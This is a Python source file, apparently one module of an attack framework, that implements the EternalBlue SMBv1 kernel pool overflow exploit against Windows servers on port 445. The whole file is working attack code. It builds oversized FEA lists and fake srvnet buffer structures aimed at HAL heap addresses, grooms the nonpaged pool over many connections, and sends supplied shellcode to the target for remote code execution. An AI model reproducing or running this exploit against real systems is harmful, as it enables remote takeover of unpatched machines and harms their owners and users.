import struct
import socket
from impacket import smb

import lib.settings


def exploit(target, **kwargs):
    shell_code = kwargs.get("shell_code", "whoami")
    num_groom_connection = kwargs.get("num_groom_connection", 5)

    unacceptable_target_servers = ['Windows 7 ', 'Windows Server ', ' 2008 ', 'Windows Vista']

    ntfea_size = 0x11000
    ntfea10000 = struct.pack('<BBH', 0, 0, 0xffdd) + 'A' * 0xffde
    ntfea11000 = (struct.pack('<BBH', 0, 0, 0) + '\x00') * 600
    ntfea11000 += struct.pack('<BHH', 0, 0, 0xf3bd) + 'A' * 0xf3be
    ntfea1f000 = (struct.pack('<BBH', 0, 0, 0) + '\x00') * 0x2494
    ntfea1f000 += struct.pack('<BBH', 0, 0, 0x48ed) + 'A' * 0x48ee
    ntfea = {0x10000: ntfea10000, 0x11000: ntfea11000}

    target_hal_heap_x64_addr = 0xffffffffffd00010
    target_hal_heap_x86_addr = 0xffdff000

    fake_srv_net_buffer = struct.pack('<II', 0x11000, 0) * 2
    fake_srv_net_buffer += struct.pack('<HHI', 0xffff, 0, 0) * 2
    fake_srv_net_buffer += '\x00' * 16
    fake_srv_net_buffer += struct.pack('<IIII', target_hal_heap_x86_addr + 0x100, 0, 0, target_hal_heap_x86_addr + 0x20)
    fake_srv_net_buffer += struct.pack('<IIHHI', target_hal_heap_x86_addr + 0x100, 0, 0x60, 0x1004, 0)
    fake_srv_net_buffer += struct.pack('<IIQ', target_hal_heap_x86_addr - 0x80, 0, target_hal_heap_x64_addr)
    fake_srv_net_buffer += struct.pack('<QQ', target_hal_heap_x64_addr + 0x100, 0)
    fake_srv_net_buffer += struct.pack('<QHHI', 0, 0x60, 0x1004, 0)
    fake_srv_net_buffer += struct.pack('<QQ', 0, target_hal_heap_x64_addr - 0x80)
    fake_srv_net_buffer_x64 = struct.pack('<II', 0x11000, 0) * 2
    fake_srv_net_buffer_x64 += struct.pack('<HHIQ', 0xffff, 0, 0, 0)
    fake_srv_net_buffer_x64 += '\x00' * 16
    fake_srv_net_buffer_x64 += '\x00' * 16
    fake_srv_net_buffer_x64 += '\x00' * 16
    fake_srv_net_buffer_x64 += struct.pack('<IIQ', 0, 0, target_hal_heap_x64_addr)
    fake_srv_net_buffer_x64 += struct.pack('<QQ', target_hal_heap_x64_addr + 0x100, 0)
    fake_srv_net_buffer_x64 += struct.pack('<QHHI', 0, 0x60, 0x1004, 0)
    fake_srv_net_buffer_x64 += struct.pack('<QQ', 0, target_hal_heap_x64_addr - 0x80)
    current_fake_srv_net_buffer = fake_srv_net_buffer

    fea_list = struct.pack('<I', 0x10000)
    fea_list += ntfea[ntfea_size]
    fea_list += struct.pack('<BHH', 0, 0, len(current_fake_srv_net_buffer) - 1) + current_fake_srv_net_buffer
    fea_list += struct.pack('<BHH', 0x12, 0x34, 0x5678)

    fake_recv_struct = struct.pack('<QII', 0, 3, 0)
    fake_recv_struct += '\x00' * 16
    fake_recv_struct += struct.pack('<QII', 0, 3, 0)
    fake_recv_struct += ('\x00' * 16) * 7
    fake_recv_struct += struct.pack('<QQ', target_hal_heap_x64_addr + 0xa0, target_hal_heap_x64_addr + 0xa0)
    fake_recv_struct += '\x00' * 16
    fake_recv_struct += struct.pack('<IIQ', target_hal_heap_x86_addr + 0xc0, target_hal_heap_x86_addr + 0xc0, 0)
    fake_recv_struct += ('\x00' * 16) * 11
    fake_recv_struct += struct.pack('<QII', 0, 0, target_hal_heap_x86_addr + 0x190)
    fake_recv_struct += struct.pack('<IIQ', 0, target_hal_heap_x86_addr + 0x1f0 - 1, 0)
    fake_recv_struct += ('\x00' * 16) * 3
    fake_recv_struct += struct.pack('<QQ', 0, target_hal_heap_x64_addr + 0x1e0)
    fake_recv_struct += struct.pack('<QQ', 0, target_hal_heap_x64_addr + 0x1f0 - 1)

    def get_nt_status(self):
        return (self['ErrorCode'] << 16) | (self['_reserved'] << 8) | self['ErrorClass']

    setattr(smb.NewSMBPacket, "getNTStatus", get_nt_status)

    def send_echo_request(connection, tid, data):
        packet = smb.NewSMBPacket()
        packet['Tid'] = tid

        transfer_command = smb.SMBCommand(smb.SMB.SMB_COM_ECHO)
        transfer_command['Parameters'] = smb.SMBEcho_Parameters()
        transfer_command['Data'] = smb.SMBEcho_Data()
        transfer_command['Parameters']['EchoCount'] = 1
        transfer_command['Data']['Data'] = data

        packet.addCommand(transfer_command)

        connection.sendSMB(packet)
        retval_packet = connection.recvSMB()

        if retval_packet.getNTStatus() == 0:
            print("echo request succeeded")
        else:
            print("bad echo request: 0x{:x}".format(retval_packet.getNTStatus()))

    def create_alloc_session(target, size):
        connection = smb.SMB(target, target)
        _, flags = connection.get_flags()
        flags &= ~smb.SMB.FLAGS2_EXTENDED_SECURITY

        if size >= 0xffff:
            flags &= ~smb.SMB.FLAGS2_UNICODE
            request_size = size // 2
        else:
            flags |= smb.SMB.FLAGS2_UNICODE
            request_size = size

        connection.set_flags(flags2=flags)

        packet = smb.NewSMBPacket()

        session_setup = smb.SMBCommand(smb.SMB.SMB_COM_SESSION_SETUP_ANDX)
        session_setup['Parameters'] = smb.SMBSessionSetupAndX_Extended_Parameters()
        session_setup['Parameters']['MaxBufferSize'] = 61440
        session_setup['Parameters']['MaxMpxCount'] = 2
        session_setup['Parameters']['VcNumber'] = 2
        session_setup['Parameters']['SessionKey'] = 0
        session_setup['Parameters']['SecurityBlobLength'] = 0
        session_setup['Parameters']['Capabilities'] = smb.SMB.CAP_EXTENDED_SECURITY
        session_setup['Data'] = struct.pack('<H', request_size) + '\x00' * 20

        packet.addCommand(session_setup)

        connection.sendSMB(packet)

        retval_packet = connection.recvSMB()
        if retval_packet.getNTStatus() == 0:
            print('SMB1 session setup allocate nonpaged pool success')
        else:
            print('SMB1 session setup allocate nonpaged pool failed')
        return connection

    def send_transfer_second(connection, tid, data, displacement):
        pkt = smb.NewSMBPacket()
        pkt['Tid'] = tid

        # assume no params

        transfer_command = smb.SMBCommand(smb.SMB.SMB_COM_TRANSACTION2_SECONDARY)
        transfer_command['Parameters'] = lib.settings.SMBTransaction2SecondaryParametersFixed()
        transfer_command['Data'] = smb.SMBTransaction2Secondary_Data()
        transfer_command['Parameters']['TotalParameterCount'] = 0
        transfer_command['Parameters']['TotalDataCount'] = len(data)

        fixed_offset = 32 + 3 + 18

        transfer_command['Data']['Pad1'] = ''
        transfer_command['Parameters']['ParameterCount'] = 0
        transfer_command['Parameters']['ParameterOffset'] = 0

        if len(data) > 0:
            pad_to_len = (4 - fixed_offset % 4) % 4
            transfer_command['Data']['Pad2'] = '\xFF' * pad_to_len
        else:
            transfer_command['Data']['Pad2'] = ''
            pad_to_len = 0

        transfer_command['Parameters']['DataCount'] = len(data)
        transfer_command['Parameters']['DataOffset'] = fixed_offset + pad_to_len
        transfer_command['Parameters']['DataDisplacement'] = displacement
        transfer_command['Data']['Trans_Parameters'] = ''
        transfer_command['Data']['Trans_Data'] = data

        pkt.addCommand(transfer_command)

        connection.sendSMB(pkt)

    def send_big_transfer(connection, tid, setup, data, params, first_fragment, send_last=True):
        packet = smb.NewSMBPacket()
        packet['Tid'] = tid

        command = struct.pack('<H', setup)

        # Use SMB_COM_NT_TRANSACT because we need to send data >65535 bytes to trigger the bug.
        transfer_command = smb.SMBCommand(smb.SMB.SMB_COM_NT_TRANSACT)
        transfer_command['Parameters'] = smb.SMBNTTransaction_Parameters()
        transfer_command['Parameters']['MaxSetupCount'] = 1
        transfer_command['Parameters']['MaxParameterCount'] = len(params)
        transfer_command['Parameters']['MaxDataCount'] = 0
        transfer_command['Data'] = smb.SMBTransaction2_Data()
        transfer_command['Parameters']['Setup'] = command
        transfer_command['Parameters']['TotalParameterCount'] = len(params)
        transfer_command['Parameters']['TotalDataCount'] = len(data)

        fixed_offset = 32 + 3 + 38 + len(command)

        if len(params) > 0:
            pad_len = (4 - fixed_offset % 4) % 4
            pad_bytes = '\xFF' * pad_len
            transfer_command['Data']['Pad1'] = pad_bytes
        else:
            transfer_command['Data']['Pad1'] = ''
            pad_len = 0

        transfer_command['Parameters']['ParameterCount'] = len(params)
        transfer_command['Parameters']['ParameterOffset'] = fixed_offset + pad_len

        if len(data) > 0:
            pad_to_len = (4 - (fixed_offset + pad_len + len(params)) % 4) % 4
            transfer_command['Data']['Pad2'] = '\xFF' * pad_to_len
        else:
            transfer_command['Data']['Pad2'] = ''
            pad_to_len = 0

        transfer_command['Parameters']['DataCount'] = first_fragment
        transfer_command['Parameters']['DataOffset'] = transfer_command['Parameters']['ParameterOffset'] + len(params) + pad_to_len

        transfer_command['Data']['Trans_Parameters'] = params
        transfer_command['Data']['Trans_Data'] = data[:first_fragment]

        packet.addCommand(transfer_command)

        connection.sendSMB(packet)
        connection.recvSMB()  # must be success

        i = first_fragment
        while i < len(data):
            send_size = min(4096, len(data) - i)
            if len(data) - i <= 4096:
                if not send_last:
                    break
            send_transfer_second(connection, tid, data[i:i + send_size], i)
            i += send_size

        if send_last:
            connection.recvSMB()
        return i

    def create_connection_big_80(target):
        sk = socket.create_connection((target, 445))
        packet = '\x00' + '\x00' + struct.pack('>H', 0xfff7)
        packet += 'BAAD'
        packet += '\x00' * 0x7c
        sk.send(packet)
        return sk

    try:
        connection = smb.SMB(target, target)
        connection.login_standard('', '')

        server_os = connection.get_server_os()
        print("connected to target server: {}".format(server_os))
        for os in unacceptable_target_servers:
            if server_os.startswith(os):
                raise lib.settings.OperatingSystemNotSupported("connected target: {} is not supported".format(server_os))

        tid = connection.tree_connect_andx('\\\\' + target + '\\' + 'IPC$')
        progress = send_big_transfer(connection, tid, 0, fea_list, '\x00' * 30, 2000, False)
        alloc_connection = create_alloc_session(target, ntfea_size - 0x1010)

        server_net_connection = []

        for i in range(num_groom_connection):
            sk = create_connection_big_80(target)
            server_net_connection.append(sk)

        hole_connection = create_alloc_session(target, ntfea_size - 0x10)

        alloc_connection.get_socket().close()

        for i in range(5):
            sk = create_connection_big_80(target)
            server_net_connection.append(sk)

        hole_connection.get_socket().close()

        send_transfer_second(connection, tid, fea_list[progress:], progress)
        retval_packet = connection.recvSMB()
        retval_status = retval_packet.getNTStatus()

        if retval_status == 0xc000000d:
            print('good response status: INVALID_PARAMETER')
        else:
            print('bad response status: 0x{:08x}'.format(retval_status))

        for sk in server_net_connection:
            sk.send(fake_recv_struct + shell_code)
        for sk in server_net_connection:
            sk.close()

        connection.disconnect_tree(tid)
        connection.logoff()
        connection.get_socket().close()
    except Exception:
        raise lib.settings.ExploitFailed('eternalblue failed')